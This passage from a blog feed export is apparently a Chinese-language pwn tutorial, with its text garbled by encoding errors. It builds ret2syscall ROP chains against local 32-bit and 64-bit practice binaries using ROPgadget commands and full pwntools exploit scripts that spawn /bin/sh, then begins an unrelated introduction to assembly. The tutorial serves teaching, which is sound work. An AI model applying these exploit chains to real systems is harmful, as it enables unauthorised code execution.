åº”è¯¥ä¸º 0</p></li><li><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ edx åº”è¯¥ä¸º 0</p></li></ul><p>è€Œæˆ‘ä»¬å¦‚ä½•æ§åˆ¶è¿™äº›å¯„å­˜å™¨çš„å€¼å‘¢ï¼Ÿè¿™é‡Œå°±éœ€è¦ä½¿ç”¨ gadgetsã€‚æ¯”å¦‚è¯´ï¼Œç°åœ¨æ ˆé¡¶æ˜¯ 10ï¼Œé‚£ä¹ˆå¦‚æœæ­¤æ—¶æ‰§è¡Œäº† pop eaxï¼Œé‚£ä¹ˆç°åœ¨ eax çš„å€¼å°±ä¸º 10ã€‚ä½†æ˜¯æˆ‘ä»¬å¹¶ä¸èƒ½æœŸå¾…æœ‰ä¸€æ®µè¿ç»­çš„ä»£ç å¯ä»¥åŒæ—¶æ§åˆ¶å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€æ®µä¸€æ®µæ§åˆ¶ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘ä»¬åœ¨ gadgets æœ€åä½¿ç”¨ ret æ¥å†æ¬¡æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹çš„åŸå› ã€‚å…·ä½“å¯»æ‰¾ gadgets çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ ropgadgets è¿™ä¸ªå·¥å…·ã€‚</p><p>é¦–å…ˆï¼Œæˆ‘ä»¬æ¥å¯»æ‰¾æ§åˆ¶ eax çš„ gadgetsï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æˆ‘ä»¬æ‰¾åˆ°ä¸€äº› eax çš„ gadgetsï¼Œæˆ‘ä»¬é€‰ç”¨ç¬¬äºŒæ¡ï¼Œå³<code>0x080bb196</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn32 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep eax<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467230-d54e8a0c-8e5f-4e76-ba7e-849a2afd2237.png" class="" title="img"><p>æ¥ç€æ˜¯ ebx å’Œ ecxï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤æˆ‘ä»¬æ‰¾åˆ°äº†<code>0x080481c9 : pop ebx ; ret</code>å’Œ<code>0x0806eb91 : pop ecx ; pop ebx ; ret</code>ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰ç”¨åè€…ï¼Œè¿™ä¸ª gadget å¯ä»¥æ§åˆ¶ ecx å’Œ ebx</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn32 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep ebx<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467294-08055070-84de-4f59-b4f0-71e0797de082.png" class="" title="img"><p>è¿˜æœ‰ edxï¼Œè¿™é‡Œæˆ‘ä»¬é€‰ç”¨<code>0x0806eb6a</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn32 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep edx<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467357-48ea4416-3870-4ae7-83d3-0e16207adf19.png" class="" title="img"><p>æ­¤å¤–ï¼Œæˆ‘ä»¬éœ€è¦è·å¾— &#x2F;bin&#x2F;sh å­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€ï¼Œå³<code>0x080be408</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn32 --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467450-00af7682-d545-4ffa-8451-8389dcd809f4.png" class="" title="img"><p>æœ€åæ˜¯ int 0x80 çš„åœ°å€ï¼Œå³<code>0x08049421</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn32 --only <span class="hljs-string">&#x27;int&#x27;</span><br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467506-9ba2416c-3a27-40a4-ad88-e558555963ad.png" class="" title="img"><p>æ‰€æœ‰çš„ gadget æ‰¾å®Œä¹‹åæˆ‘ä»¬å†™ exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn32&#x27;</span>)<br><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>pop_ecx_ebx = <span class="hljs-number">0x0806eb91</span><span class="hljs-comment">#pop ecx ; pop ebx ; ret</span><br>pop_edx = <span class="hljs-number">0x0806eb6a</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br><span class="hljs-comment">#attach(p, &#x27;b *0x8048EA1&#x27;)</span><br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span><br>payload += p32(pop_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(binsh)<br>payload += p32(pop_edx) + p32(<span class="hljs-number">0</span>)<br>payload += p32(pop_eax) + p32(<span class="hljs-number">0xb</span>)<br>payload += p32(int_0x80)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>æ ˆå¸ƒå±€</p><img src="/post/10828/1734009467572-ee3aae61-36ac-4aa4-9c43-9ce98948e9f8.png" class="" title="img"><p>æˆ‘ä»¬åœ¨ exp ä¸­åŠ å…¥è¯­å¥ attach(p, â€˜b *0x8048EA1â€™)ï¼Œå³å°†æ–­ç‚¹ä¸‹åœ¨<code>0x8048EA1</code>å¤„ï¼Œè¿™ä¸ªåœ°å€æ˜¯ main å‡½æ•°çš„ç»“å°¾ï¼Œè°ƒè¯•è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn32&#x27;</span>)<br><br>binsh = <span class="hljs-number">0x080be408</span><br>pop_eax = <span class="hljs-number">0x080bb196</span><br>pop_ecx_ebx = <span class="hljs-number">0x0806eb91</span><span class="hljs-comment">#pop ecx ; pop ebx ; ret</span><br>pop_edx = <span class="hljs-number">0x0806eb6a</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br><br>attach(p, <span class="hljs-string">&#x27;b *0x8048EA1&#x27;</span>)<span class="hljs-comment">#è°ƒè¯•è¯­å¥</span><br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span><br>payload += p32(pop_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(binsh)<br>payload += p32(pop_edx) + p32(<span class="hljs-number">0</span>)<br>payload += p32(pop_eax) + p32(<span class="hljs-number">0xb</span>)<br>payload += p32(int_0x80)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009467699-6b0e820f-2c9e-4d25-8acc-7735c59a2a43.png" class="" title="img"><p>è¿è¡Œè„šæœ¬å¼€å§‹è°ƒè¯•ï¼Œè¾“å…¥ c ç»§ç»­è¿è¡Œ</p><img src="/post/10828/1734009467787-de036a7b-c01e-4848-b111-1b38963a8a58.png" class="" title="img"><p>æˆ‘ä»¬æŸ¥çœ‹æ±‡ç¼–çª—å£ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æˆ‘ä»¬å†™å…¥çš„å†…å®¹</p><img src="/post/10828/1734009467851-e7aa4f6f-d3e9-4215-b22a-b7dbad809e31.png" class="" title="img"><p>ç„¶åè¾“å…¥ niï¼ŒæŸ¥çœ‹æ±‡ç¼–çª—å£ï¼Œæ­¤æ—¶ <code>pop ecx</code> æ˜¯ eip å³å°†è¦æ‰§è¡Œçš„æ±‡ç¼–ä»£ç ï¼›æŸ¥çœ‹æ ˆåŒºï¼Œæ­¤æ—¶æ ˆé¡¶ esp çš„ä½ç½®æ˜¯ 0ã€‚é‚£ä¹ˆå½“ç¨‹åºæ‰§è¡Œäº† <code>pop ecx</code> ä¹‹åï¼Œä¼šå°†æ ˆé¡¶ esp ä½ç½®çš„ 0 èµ‹å€¼ç»™ ecx</p><img src="/post/10828/1734009467911-736f0e8c-69d5-4764-8937-1cb9d437c5ad.png" class="" title="img"><img src="/post/10828/1734009468019-482dc29c-1635-49c6-ab79-e011421b34fe.png" class="" title="img"><p>æ¥ç€æˆ‘ä»¬è¾“å…¥ ni æˆ–è€…å›è½¦ï¼ŒæŸ¥çœ‹å¯„å­˜å™¨çª—å£å¯ä»¥çœ‹åˆ° eax å˜ä¸º 0ã€‚</p><img src="/post/10828/1734009468090-44b23787-f0f9-4877-9b28-4c305e441b4f.png" class="" title="img"><p>é€šè¿‡ä»¥ä¸Šçš„è°ƒè¯•ï¼Œæˆ‘ä»¬å°±äº†è§£äº†æ§åˆ¶å¯„å­˜å™¨çš„åŸç†ã€‚</p><p>æˆ‘ä»¬å†è¾“å…¥ ni æˆ–è€…æˆ–è€…å›è½¦ï¼Œç¨‹åºè¿è¡Œåˆ° ret å¤„ï¼Œæ­¤æ—¶ç¬¬ä¸€æ®µ gadgets å°†è¦æ‰§è¡Œå®Œæˆï¼Œå°±éœ€è¦è¿”å›ï¼Œæ­¤æ—¶è¿”å›åœ°å€æ˜¯ç¬¬äºŒæ®µ gadgetsï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šæ¥ç€æ‰§è¡Œç¬¬äºŒæ®µ gadgetsã€‚è¿™å°±æ˜¯é€šè¿‡ gadgets çš„ ret æ¥è¿ç»­æ‰§è¡Œ gadgets çš„åŸç†</p><img src="/post/10828/1734009468161-0bbe5a71-f874-4844-8dfd-b15fda2757f0.png" class="" title="img"><h2 id="64-ä½ä¾‹é¢˜"><a href="#64-ä½ä¾‹é¢˜" class="headerlink" title="64 ä½ä¾‹é¢˜"></a>64 ä½ä¾‹é¢˜</h2><p>checksec æ£€æŸ¥ç¨‹åºä¿æŠ¤æœºåˆ¶</p><img src="/post/10828/1734009468227-c588b95d-af8a-4d3f-a148-e23738f33a32.png" class="" title="img"><p>åŒæ ·ä½¿ç”¨ file å‘½ä»¤æŸ¥çœ‹ï¼Œä¾ç„¶æ˜¯é™æ€é“¾æ¥</p><img src="/post/10828/1734009468298-9f14ff0b-c693-48bc-91ad-6ae5a664dfd2.png" class="" title="img"><p>ida æ‰“å¼€ï¼ŒæŸ¥çœ‹ main å‡½æ•°ï¼Œå‘ç°æœ‰ gets å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡º</p><img src="/post/10828/1734009468531-c919f3ad-e24e-4c55-a5b1-21fc173597e5.png" class="" title="img"><p>ç”±äºæ˜¯é™æ€é“¾æ¥çš„ç¨‹åºï¼Œä¸”æ²¡æœ‰ system(â€˜&#x2F;bin&#x2F;shâ€™)è°ƒç”¨ï¼Œæˆ‘ä»¬åŒæ ·è€ƒè™‘ä½¿ç”¨ ret2syscall çš„è§£æ³•ã€‚æˆ‘ä»¬è¿˜æ˜¯éœ€è¦å®ç°ä»¥ä¸‹ç³»ç»Ÿè°ƒç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>ç”±äº 64 ä½ç¨‹åºä¸ 32 ä½ç¨‹åºåœ¨ä¿å­˜å‚æ•°çš„å¯„å­˜å™¨æœ‰æ‰€åŒºåˆ«ï¼Œå…·ä½“ä¸ºå‰å…­ä¸ªæ•´å‹æˆ–æŒ‡é’ˆå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨ RDI, RSI, RDX, RCX, R8 å’Œ R9 å¯„å­˜å™¨ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Šã€‚è€Œä¸”åœ¨ 64 ä½ä¸­ï¼Œä½¿ç”¨çš„æ˜¯ syscall æŒ‡ä»¤æ¥è¿›è¡Œç³»ç»Ÿè°ƒç”¨</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿å¾—</p><ul><li><p>ç³»ç»Ÿè°ƒç”¨å·ï¼Œå³ rax åº”è¯¥ä¸º 0x3b</p></li><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ rdi åº”è¯¥æŒ‡å‘ &#x2F;bin&#x2F;sh çš„åœ°å€ï¼Œæˆ–è€… sh çš„åœ°å€ä¹Ÿå¯ä»¥ã€‚</p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°ï¼Œå³ rsi åº”è¯¥ä¸º 0</p></li><li><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³ rdx åº”è¯¥ä¸º 0</p></li></ul><p>é¦–å…ˆå¯»æ‰¾ raxï¼Œè¿™é‡Œé€‰ç”¨ <code>0x4bc808</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep rax<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468646-dd3aa790-939b-4df5-925d-79d17157ee1f.png" class="" title="img"><p>æ¥ç€å¯»æ‰¾ rdiï¼Œè¿™é‡Œé€‰ç”¨ <code>0x401626</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep rdi<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468700-8ca3e770-d092-40ef-98e6-3a56e98fd43e.png" class="" title="img"><p>ç„¶åæ˜¯ rsiï¼Œè¿™é‡Œé€‰ç”¨ <code>0x401747</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep rsi<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468763-edfe2a4e-4b3d-4013-a8f7-8f5fa8105d14.png" class="" title="img"><p>å†ç„¶åæ˜¯ rdxï¼Œè¿™é‡Œé€‰ç”¨ <code>0x442b66</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | grep rdx<br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468820-4696d093-4de2-4084-b0e6-e6d490662710.png" class="" title="img"><p>æ­¤å¤–ï¼Œæˆ‘ä»¬éœ€è¦è·å¾— &#x2F;bin&#x2F;sh å­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€ï¼Œå³ <code>0x4a1384</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --string <span class="hljs-string">&#x27;/bin/sh&#x27;</span><br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468886-d7731faa-21f7-48c2-a06f-7c2f2486bfe7.png" class="" title="img"><p>æœ€åæ˜¯ syscall çš„åœ°å€ï¼Œå³ <code>0x4003da</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ROPgadget --binary pwn64 --only <span class="hljs-string">&#x27;syscall&#x27;</span><br></code></pre></td></tr></table></figure><img src="/post/10828/1734009468939-fbe8c689-e4e0-4383-89eb-f66c7bb2081a.png" class="" title="img"><p>ç¼–å†™ exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os = <span class="hljs-string">&#x27;linux&#x27;</span>, arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn64&#x27;</span>)<br><br>binsh = <span class="hljs-number">0x4a1384</span><br>pop_rax = <span class="hljs-number">0x4bc808</span><br>pop_rdi = <span class="hljs-number">0x401626</span><br>pop_rsi = <span class="hljs-number">0x401747</span><br>pop_rdx = <span class="hljs-number">0x442b66</span><br>syscall = <span class="hljs-number">0x4003da</span><br><br><span class="hljs-comment">#execve(&#x27;/bin/sh&#x27;, 0, 0)</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x78</span><br>payload += p64(pop_rdi) + p64(binsh)<br>payload += p64(pop_rsi) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rdx) + p64(<span class="hljs-number">0</span>)<br>payload += p64(pop_rax) + p64(<span class="hljs-number">0x3b</span>)<br>payload += p64(syscall)<br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å®é™…ä¸Š ret2syscall ä½¿ç”¨çš„æ”»å‡»æ‰‹æ³•æ˜¯ <strong>è¿”å›å¯¼å‘ç¼–ç¨‹</strong> (Return Oriented Programming)ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨ <strong>æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</strong></p><p>gadgets é€šå¸¸æ˜¯ä»¥ <code>ret</code> ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™æ ·çš„æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥å¤šæ¬¡åŠ«æŒç¨‹åºæ§åˆ¶æµï¼Œä»è€Œè¿è¡Œç‰¹å®šçš„æŒ‡ä»¤åºåˆ—ï¼Œä»¥å®Œæˆæ”»å‡»çš„ç›®çš„ã€‚</p><p>è¿”å›å¯¼å‘ç¼–ç¨‹è¿™ä¸€åç§°çš„ç”±æ¥æ˜¯å› ä¸ºå…¶æ ¸å¿ƒåœ¨äºåˆ©ç”¨äº†æŒ‡ä»¤é›†ä¸­çš„ ret æŒ‡ä»¤ï¼Œä»è€Œæ”¹å˜äº†æŒ‡ä»¤æµçš„æ‰§è¡Œé¡ºåºï¼Œå¹¶é€šè¿‡æ•°æ¡ gadget â€œæ‰§è¡Œâ€ äº†ä¸€ä¸ªæ–°çš„ç¨‹åºã€‚</p><p>ä½¿ç”¨ ROP æ”»å‡»ä¸€èˆ¬å¾—æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š</p><ul><li><p>ç¨‹åºæ¼æ´å…è®¸æˆ‘ä»¬åŠ«æŒæ§åˆ¶æµï¼Œå¹¶æ§åˆ¶åç»­çš„è¿”å›åœ°å€ã€‚</p></li><li><p>å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚</p></li></ul><p>ä½œä¸ºä¸€é¡¹åŸºæœ¬çš„æ”»å‡»æ‰‹æ®µï¼ŒROP æ”»å‡»å¹¶ä¸å±€é™äºæ ˆæº¢å‡ºæ¼æ´ï¼Œä¹Ÿè¢«å¹¿æ³›åº”ç”¨åœ¨å †æº¢å‡ºç­‰å„ç±»æ¼æ´çš„åˆ©ç”¨å½“ä¸­ã€‚</p><h3 id="32-ä½ç³»ç»Ÿè°ƒç”¨å·"><a href="#32-ä½ç³»ç»Ÿè°ƒç”¨å·" class="headerlink" title="32 ä½ç³»ç»Ÿè°ƒç”¨å·"></a>32 ä½ç³»ç»Ÿè°ƒç”¨å·</h3><p><a href="https://syscalls32.paolostivanin.com/">https://syscalls32.paolostivanin.com/</a></p><h3 id="64-ä½ç³»ç»Ÿè°ƒç”¨å·"><a href="#64-ä½ç³»ç»Ÿè°ƒç”¨å·" class="headerlink" title="64 ä½ç³»ç»Ÿè°ƒç”¨å·"></a>64 ä½ç³»ç»Ÿè°ƒç”¨å·</h3><p><a href="https://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html">https://shell-storm.org/shellcode/files/linux-4.7-syscalls-x64.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwnå…¥é—¨ç³»åˆ—ï¼ˆä¸€ï¼‰</title>
    <link href="/post/47670.html"/>
    <url>/post/47670.html</url>
    
    <content type="html"><![CDATA[<h1 id="æ±‡ç¼–è¯­è¨€"><a href="#æ±‡ç¼–è¯­è¨€" class="headerlink" title="æ±‡ç¼–è¯­è¨€"></a>æ±‡ç¼–è¯­è¨€</h1><p>æ±‡ç¼–è¯­è¨€æ˜¯ä¸€ç§ä½çº§ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒä¸è®¡ç®—æœºçš„ç¡¬ä»¶å…³ç³»éå¸¸å¯†åˆ‡ï¼Œé€šå¸¸ç”¨äºç¼–å†™è¿è¡Œæ•ˆç‡æé«˜çš„è½¯ä»¶ã€‚ç›¸æ¯”é«˜çº§è¯­è¨€ï¼ˆå¦‚ Cã€Pythonï¼‰ï¼Œæ±‡ç¼–è¯­è¨€æ›´æ¥è¿‘æœºå™¨è¯­è¨€ï¼ˆ0 å’Œ 1ï¼‰ï¼Œç¼–å†™æ—¶éœ€è¦æ‰‹åŠ¨ç®¡ç†å¯„å­˜å™¨ã€å†…å­˜ç­‰ç¡¬ä»¶èµ„æºã€‚</p><h2 id="å¼•å…¥"><a href="#å¼•å…¥" class="headerlink" title="å¼•å…¥"></a>å¼•å…¥</h2><p>Cè¯­è¨€ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span>&#123;<br>    <span class="hljs-type">int</span> t = x + y;<br>    <span class="hljs-keyword">return</span> t;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ±‡ç¼–ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">sum:<br>    push ebp<br>    mov ebp, esp<br>    mov eax, [ebp+12]<br>    add eax, [ebp+8]<br>    pop ebp<br>    ret<br></code></pre></td></tr></table></figure><h2 id="1-ä»€ä¹ˆæ˜¯æ±‡ç¼–è¯­è¨€"><a href="#1-ä»€ä¹ˆæ˜¯æ±‡ç¼–è¯­è¨€" class="headerlink" title="1. ä»€ä¹ˆæ˜¯æ±‡ç¼–è¯­è¨€"></a>1. ä»€ä¹ˆæ˜¯æ±‡ç¼–è¯­è¨€</h2><p>æ±‡ç¼–è¯­è¨€æ˜¯ä»‹äºæœºå™¨è¯­è¨€å’Œé«˜çº§è¯­è¨€ä¹‹é—´çš„ä¸€ç§è¯­è¨€ã€‚å®ƒä½¿ç”¨åŠ©è®°ç¬¦ï¼ˆå¦‚ <code>MOV</code>ã€<code>ADD</code>ã€<code>JMP</code> ç­‰ï¼‰æ¥è¡¨ç¤ºæœºå™¨æŒ‡ä»¤ï¼Œèƒ½å¤Ÿç›´æ¥æ§åˆ¶ç¡¬ä»¶ã€‚æ¯ç§è®¡ç®—æœºæ¶æ„éƒ½æœ‰è‡ªå·±çš„æ±‡ç¼–è¯­è¨€ï¼Œä¾‹å¦‚ï¼š</p><ul><li><p><strong>x86 æ±‡ç¼–</strong>ï¼šç”¨äº Intel å’Œ AMD å¤„ç†å™¨ã€‚</p></li><li><p><strong>ARM æ±‡ç¼–</strong>ï¼šç”¨äºç§»åŠ¨è®¾å¤‡å’ŒåµŒå…¥å¼ç³»ç»Ÿã€‚</p></li></ul><h3 id="æ±‡ç¼–è¯­è¨€çš„ç‰¹ç‚¹ï¼š"><a href="#æ±‡ç¼–è¯­è¨€çš„ç‰¹ç‚¹ï¼š" class="headerlink" title="æ±‡ç¼–è¯­è¨€çš„ç‰¹ç‚¹ï¼š"></a>æ±‡ç¼–è¯­è¨€çš„ç‰¹ç‚¹ï¼š</h3><ul><li><p><strong>ä½çº§æ€§</strong>ï¼šä¸ç¡¬ä»¶ç›´æ¥äº¤äº’ï¼Œæä¾›å¯¹å¯„å­˜å™¨ã€å†…å­˜ç­‰èµ„æºçš„ç›´æ¥æ§åˆ¶ã€‚</p></li><li><p><strong>é«˜æ•ˆç‡</strong>ï¼šç¨‹åºæ‰§è¡Œé€Ÿåº¦å¿«ï¼Œé€‚åˆç¼–å†™éœ€è¦æé«˜æ€§èƒ½çš„ä»£ç ã€‚</p></li><li><p><strong>å¹³å°ç›¸å…³æ€§</strong>ï¼šä¸åŒæ¶æ„çš„æ±‡ç¼–è¯­è¨€ä¸é€šç”¨ã€‚</p></li></ul><h2 id="2-æ±‡ç¼–è¯­è¨€çš„åŸºæœ¬æ¦‚å¿µ"><a href="#2-æ±‡ç¼–è¯­è¨€çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="2. æ±‡ç¼–è¯­è¨€çš„åŸºæœ¬æ¦‚å¿µ"></a>2. æ±‡ç¼–è¯­è¨€çš„åŸºæœ¬æ¦‚å¿µ</h2><h3 id="2-1-å¯„å­˜å™¨"><a href="#2-1-å¯„å­˜å™¨" class="headerlink" title="2.1 å¯„å­˜å™¨"></a>2.1 å¯„å­˜å™¨</h3><p>å¯„å­˜å™¨æ˜¯ CPU å†…éƒ¨çš„é«˜é€Ÿå­˜å‚¨å•å…ƒï¼Œç”¨äºå­˜å‚¨æ•°æ®ã€åœ°å€ã€ç¨‹åºçŠ¶æ€ç­‰ã€‚ä¸åŒæ¶æ„çš„ CPU å…·æœ‰ä¸åŒçš„å¯„å­˜å™¨é›†ã€‚åœ¨ x86 æ¶æ„ä¸­ï¼Œå¯„å­˜å™¨çš„å¤§å°ç»å†äº†ä» 16 ä½åˆ° 32 ä½å†åˆ° 64 ä½çš„æ‰©å±•ï¼Œç°ä»£ x86-64 æ¶æ„æ”¯æŒ 64 ä½å¯„å­˜å™¨ã€‚</p><p>X86æ¶æ„æ˜¯å¾®å¤„ç†å™¨æ‰§è¡Œçš„è®¡ç®—æœºè¯­è¨€æŒ‡ä»¤é›†ï¼ŒæŒ‡ä¸€ä¸ªintelé€šç”¨è®¡ç®—æœºç³»åˆ—çš„æ ‡å‡†ç¼–å·ç¼©å†™ï¼Œä¹Ÿæ ‡è¯†ä¸€å¥—é€šç”¨çš„è®¡ç®—æœºæŒ‡ä»¤é›†ã€‚</p><h4 